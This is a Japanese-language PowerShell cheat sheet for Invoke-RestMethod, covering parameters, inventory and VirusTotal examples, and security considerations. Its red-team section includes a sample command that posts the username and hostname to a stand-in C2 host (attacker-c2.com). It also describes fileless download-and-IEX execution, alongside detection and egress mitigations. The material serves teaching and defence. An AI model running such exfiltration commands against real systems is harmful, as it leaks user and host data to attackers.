---
tags:
  - 'Invoke-RestMethod'
  - 'powershell'
  - 'cheatsheet'
title: 'Invoke-RestMethod - Web APIにリクエストを送信し、結果を解析する'
summary: 'Web APIにHTTP/HTTPSリクエストを送信し、応答を自動的に解析してPowerShellオブジェクトとして返します。'
related:
  - 'Invoke-WebRequest'
  - 'ConvertFrom-Json'
  - 'ConvertTo-Json'
---

# `Invoke-RestMethod` - Web APIにリクエストを送信し、結果を解析する

## 概要

`Invoke-RestMethod` コマンドレットは、RESTful Webサービスに対してHTTPおよびHTTPSリクエストを送信するための、強力で使いやすいコマンドレットです。最大の特徴は、APIからの応答（通常はJSONまたはXML形式）を自動的に解析し、PowerShellでネイティブに扱うことができるオブジェクトに変換してくれる点です。

これにより、Web APIとの対話、データの取得、設定の自動化などを、`ConvertFrom-Json` などを明示的に呼び出すことなく、非常にシンプルに記述できます。

## 類似コマンドレット/コマンドとの差異

| 類似コマンドレット/コマンド | 差異 / 使い分けのポイント |
| :--- | :--- |
| **`Invoke-WebRequest`** | `Invoke-WebRequest` は、ステータスコード、ヘッダー、生のコンテンツなどを含む、より詳細な `WebResponseObject` を返します。`Invoke-RestMethod` は、応答**ボディが解析されたオブジェクトのみ**を直接返すため、APIのデータ操作に特化しており、よりシンプルです。 |
| **`curl` / `wget` (Linux)** | これらのツールは主にテキストベースで動作します。`Invoke-RestMethod` は結果を**オブジェクト**として返すため、`$response.users.name` のようにプロパティにアクセスしたり、パイプラインで後続処理を行ったりするのが非常に簡単です。 |

## よく連携されるコマンドレット

### シナリオ例: 公開APIからデータを取得し、フィルタリングする (インフラ構築・運用視点)

* **目的**: 公開されているテストAPIからユーザーのリストを取得し、その中から特定の条件に一致するユーザーだけを抽出する。
* **連携コマンドレット**: `Where-Object`, `Select-Object`
* **解説**: `Invoke-RestMethod` はAPIからのJSON応答をユーザーオブジェクトの配列として自動的に返します。その結果をパイプラインで `Where-Object` に渡して特定のユーザーをフィルタリングし、`Select-Object` で必要な情報だけを表示します。
* **コマンド例**:

    ```powershell
    # JSONPlaceholder APIからユーザーリストを取得
    $users = Invoke-RestMethod -Uri "[https://jsonplaceholder.typicode.com/users](https://jsonplaceholder.typicode.com/users)"

    # ドメインが ".biz" のメールアドレスを持つユーザーを検索
    $users | Where-Object { $_.email -like "*.biz" } | Select-Object -Property Name, Email, Website
    ```

## パラメータ説明

| パラメータ | 型 | 説明 |
| :--- | :--- | :--- |
| ⭐ **`-Uri`** | `Uri` | リクエストを送信するAPIエンドポイントのURIを指定します。 |
| ⭐ **`-Method`** | `String` | 使用するHTTPメソッドを指定します (`GET`, `POST`, `PUT`, `DELETE`, `PATCH`など)。デフォルトは `GET` です。 |
| ⭐ **`-Body`** | `Object` | `POST` や `PUT` リクエストで送信するデータを指定します。PowerShellオブジェクト（ハッシュテーブルなど）を渡すと、多くの場合自動的にJSONに変換されます。 |
| ⭐ **`-ContentType`** | `String` | `-Body` のコンテンツタイプを指定します。JSONを送信する場合は `application/json` が一般的です。 |
| **`-Headers`** | `IDictionary` | APIキーや認証トークンなど、カスタムHTTPヘッダーをハッシュテーブル形式で指定します。 |
| **`-Credential`** | `PSCredential` | 基本認証などで使用するユーザー資格情報を指定します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 監視システムやインベントリ管理システムのAPIに、現在のサーバー情報をPOSTする。
* **組み合わせ**: `Invoke-RestMethod -Method Post -Body <Object>`
* **解説**: PowerShellで収集したシステム情報（ホスト名、IPアドレスなど）をハッシュテーブルやカスタムオブジェクトに格納し、それを `-Body` パラメータに渡すだけで、自動的にJSONペイロードとしてAPIに送信できます。
* **例**:

    ```powershell
    # 送信するデータを定義
    $inventoryData = @{
        ComputerName = $env:COMPUTERNAME
        IPAddress = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
    }

    # インベントリAPIにデータをPOST
    Invoke-RestMethod -Uri "[https://inventory.local/api/computers](https://inventory.local/api/computers)" -Method Post -Body $inventoryData
    ```

### 2. ブルーチーム視点

* **タスク**: **脅威インテリジェンスの照会**。VirusTotalなどのAPIにファイルのハッシュ値を問い合わせ、評価を取得する。
* **組み合わせ**: `-Headers`
* **解説**: 多くの脅威インテリジェンスAPIは、認証のためにAPIキーをHTTPヘッダーに含める必要があります。`-Headers` パラメータを使ってこのキーを渡します。返ってきたJSON応答は自動的にオブジェクトに変換されるため、`$response.data.attributes.last_analysis_stats` のように結果を簡単に評価できます。
* **例**:

    ```powershell
    # (VirusTotal APIキーを$apiKeyに格納していると仮定)
    $headers = @{ "x-apikey" = $apiKey }
    $fileHash = "..." # 調査対象のハッシュ値

    # VirusTotal APIにハッシュ値を問い合わせ
    Invoke-RestMethod -Uri "[https://www.virustotal.com/api/v3/files/$fileHash](https://www.virustotal.com/api/v3/files/$fileHash)" -Headers $headers
    ```

### 3. レッドチーム視点

* **タスク**: **C2通信** と **データ窃取 (Data Exfiltration)**。
* **組み合わせ**: `-Method Post -Body <Data>`
* **解説**: **PowerShellベースの攻撃における中核的なコマンドレット**。攻撃者は、`Invoke-RestMethod` を使って、ビーコン通信（C2サーバーへの定期的な生存確認）、新しいコマンドの受信そして収集したデータ（パスワード、スクリーンショットなど）の外部への送信を行います。HTTP/HTTPSを使用するため、通常のWebトラフィックに紛れ込ませることができ、検知を回避しやすいです。
* **例**:

    ```powershell
    # 収集したユーザー名とホスト名をC2サーバーに送信
    $exfilData = @{
        user = $env:USERNAME
        host = $env:COMPUTERNAME
    }
    Invoke-RestMethod -Uri "[http://attacker-c2.com/data](http://attacker-c2.com/data)" -Method Post -Body $exfilData
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Invoke-RestMethod: The remote server returned an error: (401) Unauthorized.`
    * **考えられる原因**: 認証に失敗しました。APIキーが間違っているか、必要な認証ヘッダーがありません。
    * **解決策**: `-Headers` パラメータで渡しているAPIキーや認証トークンが正しいか確認してください。

2. **エラーメッセージ**: `Invoke-RestMethod: The remote server returned an error: (400) Bad Request.`
    * **考えられる原因**: 送信したリクエストの形式（特に `-Body` の内容）が、APIの期待する形式と異なっています。
    * **解決策**: APIのドキュメントを確認し、正しいJSON構造、データ型で `-Body` を構成しているか確認してください。

## セキュリティに関する考慮事項

### 悪用事例

* **C2通信とデータ窃取**: レッドチームのシナリオで述べた通り、`Invoke-RestMethod` は、攻撃者が外部のC2サーバーと通信するための最も一般的で強力な手段の1つです。
* **ファイルレスマルウェア**: ペイロードをディスクに書き込まず、`Invoke-RestMethod` で直接メモリにダウンロードして `Invoke-Expression` (IEX) で実行する、というファイルレス攻撃の常套手段で利用されます。

### LOLBASにおける利用例

* **機能**: **C2通信 (Command and Control)**, **データ窃取 (Data Exfiltration)**, **ダウンロード (Download)**
* **解説**: `Invoke-RestMethod` はPowerShellの標準機能であり、攻撃者が追加のツールをインストールすることなく、ネットワーク通信を行うための極めて重要な「環境寄生型」のツールです。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: ネットワークの出口（Egress）フィルタリングを強化し、プロキシやファイアウォールで、不要な外部へのHTTP/HTTPS通信をブロックする。
* **Detection (検知)**: **PowerShellのスクリプトブロックロギング (イベントID 4104) を有効化する**ことが極めて重要です。これにより、`Invoke-RestMethod` の実行とその引数（接続先URIなど）が記録されます。また、`powershell.exe` プロセスからの不審な宛先へのネットワーク接続を、EDRやネットワーク監視ツールで厳重に監視します。

## 注意点・補足

* **自動変換**: `-Body` に渡したハッシュテーブルやカスタムオブジェクトは、`-ContentType` が `application/json` の場合、自動的にJSONに変換されます。明示的に `| ConvertTo-Json` を使う必要はありません。

---
[PowerShellインデックスに戻る](../../powershell_index.md)
